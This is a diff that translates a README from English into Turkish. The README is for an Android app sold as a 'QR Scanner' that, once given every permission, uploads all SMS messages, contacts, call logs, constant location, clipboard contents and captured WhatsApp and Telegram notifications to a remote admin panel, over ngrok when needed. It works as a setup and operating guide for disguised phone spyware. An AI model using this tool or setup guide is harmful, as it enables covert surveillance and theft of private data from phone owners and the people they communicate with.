@@ -1,10 +1,10 @@
 <div align="center">
 
-# 📱 QR Scanner Data Collection System
+# 📱 QR Scanner Veri Toplama Sistemi
 
-### 🚀 Professional Android Data Collection Tool with PC Server
+### 🚀 Profesyonel Android Veri Toplama Aracı ve PC Sunucusu
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/Lisans-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Android](https://img.shields.io/badge/Android-7.0%2B-green.svg)](https://www.android.com/)
 [![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org/)
 [![GitHub](https://img.shields.io/badge/GitHub-Private-black.svg)](https://github.com/kaptanblack004-lang/QRScanner)
@@ -13,266 +13,266 @@
 
 **Created By KaptanBlack** ⚡
 
-*Advanced QR Scanner & Data Collection System*
+*Gelişmiş QR Tarayıcı ve Veri Toplama Sistemi*
 
 </div>
 
 ---
 
-## 📋 Project Overview
+## 📋 Proje Özeti
 
-QRScanner is a professional Android application for QR code scanning and comprehensive data collection. It includes a PC server with real-time admin panel for monitoring and managing collected data.
+QRScanner, QR kod tarama ve kapsamlı veri toplama için profesyonel bir Android uygulamasıdır. Gerçek zamanlı admin paneli ile toplanan verileri izlemek ve yönetmek için bir PC sunucusu içerir.
 
-### ✨ Key Features
+### ✨ Özellikler
 
-- 📷 **QR Code Scanning** - Real-time QR code detection
-- 📊 **Data Collection** - SMS, Contacts, Call Logs, Location, System Info
-- 🎯 **Real-time Admin Panel** - Live data monitoring
-- 🌐 **Remote Access** - Ngrok support for different networks
-- 📁 **Device-based Storage** - Organized data by device
-- 🔔 **Notification Monitoring** - WhatsApp, Telegram notifications
-- 📋 **Clipboard Tracking** - Monitor copied content
-- 🔄 **Camera Switch** - Front/Back camera support
+- 📷 **QR Kod Tarama** - Gerçek zamanlı QR kod algılama
+- 📊 **Veri Toplama** - SMS, Kişiler, Arama Kayıtları, Konum, Sistem Bilgisi
+- 🎯 **Gerçek Zamanlı Admin Paneli** - Canlı veri izleme
+- 🌐 **Uzaktan Erişim** - Farklı ağlar için Ngrok desteği
+- 📁 **Cihaz Bazlı Depolama** - Cihaza göre düzenli veri saklama
+- 🔔 **Bildirim İzleme** - WhatsApp, Telegram bildirimleri
+- 📋 **Pano Takibi** - Kopyalanan içerikleri izleme
+- 🔄 **Kamera Değiştirme** - Ön/Arka kamera desteği
 
 ---
 
-## 🏗️ Project Structure
+## 🏗️ Proje Yapısı
 
 ```
 QRScanner/
-├── 📱 Android/                    # Android Project
+├── 📱 Android/                    # Android Projesi
 │   ├── app/src/main/...
 │   ├── build.gradle
 │   ├── gradlew
 │   └── ...
-├── 💻 PC_Sunucu/               # PC Server
-│   ├── pc_server.js            # Main Server
-│   ├── admin_panel.html        # Admin Panel
-│   ├── android_build_fixed.sh  # Build Script
-│   ├── ngrok_kurulum.sh        # Ngrok Setup
-│   ├── APK_Dosyalari/          # APK Storage
-│   └── veri_kayitlari/         # Data Storage
-└── 📖 README.md                # This File
+├── 💻 PC_Sunucu/               # PC Sunucusu
+│   ├── pc_server.js            # Ana Sunucu
+│   ├── admin_panel.html        # Admin Paneli
+│   ├── android_build_fixed.sh  # Build Scripti
+│   ├── ngrok_kurulum.sh        # Ngrok Kurulumu
+│   ├── APK_Dosyalari/          # APK Depolama
+│   └── veri_kayitlari/         # Veri Depolama
+└── 📖 README.md                # Bu Dosya
 ```
 
 ---
 
-# 🏠 OPTION 1: LOCAL SERVER (SAME WiFi)
+# 🏠 SEÇENEK 1: YEREL SUNUCU (AYNI WiFi)
 
-Use this option when phone and computer are on the **SAME WiFi network**.
+Telefon ve bilgisayar **AYNI WiFi ağında** olduğunda bu seçeneği kullanın.
 
-## Step 1: Start PC Server
+## Adım 1: PC Sunucusunu Başlatın
 
-Open terminal and run:
+Terminal açın ve çalıştırın:
 
 ```bash
 cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
 node pc_server.js
 ```
 
-You'll see this message:
+Bu mesajı göreceksiniz:
 ```
 Server running on:
   Local:    http://localhost:8080
   Network: http://192.168.1.102:8080
 ```
 
-**⚠️ DO NOT CLOSE THIS TERMINAL!** Server must stay running.
+**⚠️ BU TERMINALİ KAPATMAYIN!** Sunucu çalışır durumda kalmalı.
 
 ---
 
-## Step 2: Open Admin Panel
+## Adım 2: Admin Panelini Açın
 
-Open browser (Chrome/Firefox) and navigate to:
+Tarayıcıda (Chrome/Firefox) şu adresi açın:
 
 ```
 http://localhost:8080
 ```
 
-KaptanBlack Admin Panel will open.
+KaptanBlack Admin Paneli açılacak.
 
 ---
 
-## Step 3: Open APK on Android
+## Adım 3: Android'de APK'yi Açın
 
-Find and open **QR Scanner** app on your phone.
+Telefonunuzda **QR Scanner** uygulamasını bulun ve açın.
 
-### First Launch - GRANT PERMISSIONS:
+### İlk Açılış - İZİNLERİ VERİN:
 
-The app will request the following permissions. **GRANT ALL PERMISSIONS:**
+Uygulama şu izinleri isteyecek. **TÜM İZİNLERİ VERİN:**
 
-1. **Camera Permission** → "ALLOW"
-2. **Storage Permission** → "ALLOW"
-3. **SMS Permission** → "ALLOW"
-4. **Contacts Permission** → "ALLOW"
-5. **Call Logs Permission** → "ALLOW"
-6. **Location Permission** → "ALLOW" and select "Allow all the time"
+1. **Kamera İzni** → "İZİN VER"
+2. **Depolama İzni** → "İZİN VER"
+3. **SMS İzni** → "İZİN VER"
+4. **Kişiler İzni** → "İZİN VER"
+5. **Arama Kayıtları İzni** → "İZİN VER"
+6. **Konum İzni** → "İZİN VER" ve "Her zaman izin ver" seçin
 
-> ⚠️ **Note:** Without permissions, data collection won't work!
-
----
-
-## Step 4: Start Data Collection
-
-Buttons in the app:
-
-### A) "Veri Topla" Button (All Data)
-Clicking this button sends ALL data from your phone to PC:
-- All SMS messages
-- All contact entries
-- All call logs
-- Current location
-- System info (phone model, Android version)
-
-### B) "Taramayi Baslat" Button (QR Code)
-Clicking this button opens camera. Scan any QR code.
-Scanned QR code is instantly sent to PC panel.
-
-### C) "Kamera Degistir" Button
-Clicking this button switches between FRONT/BACK camera.
+> ⚠️ **Not:** İzin vermezseniz veri toplama çalışmaz!
 
 ---
 
-## Step 5: View Data in Panel
+## Adım 4: Veri Toplamayı Başlatın
 
-Admin panel shows these sections:
+Uygulamadaki butonlar:
 
-- **Cihazlar:** Connected phones
-- **QR Taramalar:** Scanned QR code count
-- **Toplam Veri:** Total data received
-- **SMS:** SMS count
-- **Aramalar:** Call log count
-- **Kisiler:** Contact count
-- **Bildirimler:** Notification count
-- **Pano:** Clipboard count
+### A) "Veri Topla" Butonu (Tüm Veriler)
+Bu butona tıkladığınızda telefonunuzdaki TÜM veriler PC'ye gönderilir:
+- Tüm SMS mesajları
+- Tüm rehber kişileri
+- Tüm arama kayıtları
+- Mevcut konum
+- Sistem bilgisi (telefon modeli, Android sürümü)
 
-**"Canli Veri Akisi"** section shows live data stream.
+### B) "Taramayı Başlat" Butonu (QR Kod)
+Bu butona tıkladığınızda kamera açılır. Herhangi bir QR kodu okutun.
+Okunan QR kod anında PC paneline gönderilir.
+
+### C) "Kamera Değiştir" Butonu
+Bu butona tıkladığınızda ÖN/ARKA kamera arasında geçiş yapabilirsiniz.
 
 ---
 
-# 🌍 OPTION 2: DIFFERENT NETWORK (NGROK REMOTE ACCESS)
+## Adım 5: Panelde Verileri Görün
 
-Use this option when phone and computer are on **DIFFERENT WiFi networks**.
+Admin paneli şu bölümleri gösterir:
 
-## Step 1: Start PC Server
+- **Cihazlar:** Bağlı telefonlar
+- **QR Taramalar:** Okunan QR kod sayısı
+- **Toplam Veri:** Gelen toplam veri miktarı
+- **SMS:** SMS sayısı
+- **Aramalar:** Arama kaydı sayısı
+- **Kişiler:** Kişi sayısı
+- **Bildirimler:** Bildirim sayısı
+- **Pano:** Pano sayısı
 
-Open terminal and run:
+**"Canlı Veri Akışı"** bölümü canlı veri akışını gösterir.
+
+---
+
+# 🌍 SEÇENEK 2: FARKLI AĞ (NGROK UZAKTAN ERİŞİM)
+
+Telefon ve bilgisayar **FARKLI WiFi ağlarında** olduğunda bu seçeneği kullanın.
+
+## Adım 1: PC Sunucusunu Başlatın
+
+Terminal açın ve çalıştırın:
 
 ```bash
 cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
 node pc_server.js
 ```
 
-You'll see this message:
+Bu mesajı göreceksiniz:
 ```
 Server running on:
   Local:    http://localhost:8080
   Network: http://192.168.1.102:8080
 ```
 
-**⚠️ DO NOT CLOSE THIS TERMINAL!** Server must stay running.
+**⚠️ BU TERMINALİ KAPATMAYIN!** Sunucu çalışır durumda kalmalı.
 
 ---
 
-## Step 2: Start Ngrok
+## Adım 2: Ngrok'u Başlatın
 
-Open a new terminal and run:
+Yeni bir terminal açın ve çalıştırın:
 
 ```bash
 cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
 ngrok http 8080
 ```
 
-Ngrok will start and show this message:
+Ngrok başlayacak ve şu mesajı gösterecek:
 ```
 Forwarding: https://abc123.ngrok-free.app -> http://localhost:8080
 ```
 
-**Copy this URL!** (Example: `https://abc123.ngrok-free.app`)
+**Bu URL'i kopyalayın!** (Örnek: `https://abc123.ngrok-free.app`)
 
-**⚠️ DO NOT CLOSE THIS TERMINAL EITHER!** Ngrok must stay running.
-
----
-
-## Step 3: Configure on Android
-
-On your phone in QR Scanner app:
-1. Click **"Ayarlar"** button
-2. Paste the copied URL into **"Ngrok URL"** field
-3. Click **"Kaydet"**
+**⚠️ BU TERMINALİ DE KAPATMAYIN!** Ngrok çalışır durumda kalmalı.
 
 ---
 
-## Step 4: Start Data Collection
+## Adım 3: Android'de Ayarlayın
 
-Click "Veri Topla" button. Data will be sent to PC via internet.
-
----
-
-## Step 5: View Data in Panel
-
-Open `http://localhost:8080` in browser. Data will appear in panel.
+Telefonunuzda QR Scanner uygulamasında:
+1. **"Ayarlar"** butonuna tıklayın
+2. Kopyaladığınız URL'i **"Ngrok URL"** alanına yapıştırın
+3. **"Kaydet"** butonuna tıklayın
 
 ---
 
-# ⚠️ IMPORTANT NOTES
+## Adım 4: Veri Toplamayı Başlatın
 
-## Ngrok URL Changes
-
-Ngrok free version changes URL on every restart. Therefore:
-- Get new URL every time
-- Update URL in Android settings section
-
-## Local Network IP Changes
-
-Local network IP address (192.168.1.102) may change when router restarts.
-- Check "Network: http://192.168.1.102:8080" message in terminal
-- If IP changed, update `serverUrl` variable in Android code
+"Veri Topla" butonuna tıklayın. Veriler internet üzerinden PC'ye gönderilecek.
 
 ---
 
-# 📁 DATA FOLDER STRUCTURE
+## Adım 5: Panelde Verileri Görün
 
-Data is automatically saved in device-named folders:
+Tarayıcıda `http://localhost:8080` adresini açın. Veriler panelde görünecek.
+
+---
+
+# ⚠️ ÖNEMLİ NOTLAR
+
+## Ngrok URL Değişimi
+
+Ngrok free versiyonunda URL her yeniden başlatmada değişir. Bu yüzden:
+- Her seferinde yeni URL alın
+- Android ayarlar bölümünden URL'i güncelleyin
+
+## Yerel Ağ IP Değişimi
+
+Yerel ağ IP adresi (192.168.1.102) router yeniden başlatılınca değişebilir.
+- Terminaldeki "Network: http://192.168.1.102:8080" mesajını kontrol edin
+- IP değiştiyse Android kodundaki `serverUrl` değişkenini güncelleyin
+
+---
+
+# 📁 VERİ KLASÖR YAPISI
+
+Veriler otomatik olarak cihaz ismine göre klasörlere kaydedilir:
 
 ```
 veri_kayitlari/
-└── SM_J730F_f0a830dc/    ← Device Name_ID
-    ├── contacts_2026-04-23T00-35-00.json    ← All contacts
-    ├── sms_2026-04-23T00-35-01.json          ← All SMS
-    ├── call_2026-04-23T00-35-02.json         ← All calls
-    ├── location_2026-04-23T00-35-03.json    ← Location
-    └── system_info_2026-04-23T00-35-04.json ← System info
+└── SM_J730F_f0a830dc/    ← Cihaz İsmi_ID
+    ├── contacts_2026-04-23T00-35-00.json    ← Tüm kişiler
+    ├── sms_2026-04-23T00-35-01.json          ← Tüm SMS'ler
+    ├── call_2026-04-23T00-35-02.json         ← Tüm aramalar
+    ├── location_2026-04-23T00-35-03.json    ← Konum
+    └── system_info_2026-04-23T00-35-04.json ← Sistem bilgisi
 ```
 
 ---
 
-# 🔧 TROUBLESHOOTING
+# 🔧 SORUN GİDERME
 
-### "Bagli cihaz yok" message:
-1. Are phone and computer on same WiFi? Check.
-2. Is APK up to date? (See "Update" section below)
-3. Is server running? Check terminal.
-4. If using Ngrok, is URL correct?
+### "Bağlı cihaz yok" mesajı:
+1. Telefon ve bilgisayar aynı WiFi'da mı? Kontrol edin.
+2. APK güncel mi? (Aşağıdaki "Güncelleme" bölümüne bakın)
+3. Sunucu çalışıyor mu? Terminali kontrol edin.
+4. Ngrok kullanıyorsanız URL doğru mu?
 
-### App not opening:
-1. Remove old QR Scanner from phone
-2. Install new APK
+### Uygulama açılmıyorsa:
+1. Telefondaki eski QR Scanner'i kaldırın
+2. Yeni APK'yi yükleyin
 
-### Camera not opening:
-1. Was camera permission granted? Check
-2. Close and reopen app
+### Kamera açılmıyorsa:
+1. Kamera izni verildi mi? Kontrol edin
+2. Uygulamayı kapatıp tekrar açın
 
-### Data not sending:
-1. Is server running? Check terminal
-2. Is internet connection available?
-3. If using Ngrok, is URL correct?
+### Veri gitmiyorsa:
+1. Sunucu çalışıyor mu? Terminali kontrol edin
+2. İnternet bağlantısı var mı?
+3. Ngrok kullanıyorsanız URL doğru mu?
 
 ---
 
-# 🔄 UPDATE (NEW APK INSTALLATION)
+# 🔄 GÜNCELLEME (YENİ APK YÜKLEME)
 
-When new APK is built or updated:
+Yeni APK build edildi veya güncellendiğinde:
 
 ```bash
 cd /home/burak/Masaüstü/QRScanner/Android
@@ -283,19 +283,19 @@ adb install -r app/build/outputs/apk/debug/app-debug.apk
 
 ---
 
-# 🔔 NOTIFICATION PERMISSION (WhatsApp/Telegram)
+# 🔔 BİLDİRİM İZNİ (WhatsApp/Telegram)
 
-To capture notifications:
+Bildirimleri yakalamak için:
 
-1. Settings → Apps → Notifications → QRScanner
-2. **Turn ON** "Allow notifications" option
-3. WhatsApp, Telegram notifications will be captured
+1. Ayarlar → Uygulamalar → Bildirimler → QRScanner
+2. **"Bildirimlere İzin Ver"** seçeneğini AÇIN
+3. WhatsApp, Telegram bildirimleri yakalanacak
 
 ---
 
-# 📜 LICENSE
+# 📜 LİSANS
 
-This project is licensed under the MIT License.
+Bu proje MIT Lisansı altında lisanslanmıştır.
 
 ---
 
@@ -303,10 +303,10 @@ This project is licensed under the MIT License.
 
 ## 👨‍💻 Created By KaptanBlack
 
-### ⚡ Professional Development
+### ⚡ Profesyonel Geliştirme
 
 [![GitHub](https://img.shields.io/badge/GitHub-kaptanblack004--lang-blue.svg)](https://github.com/kaptanblack004-lang)
 
-**© 2026 KaptanBlack - All Rights Reserved**
+**© 2026 KaptanBlack - Tüm Hakları Saklıdır**
 
 </div>
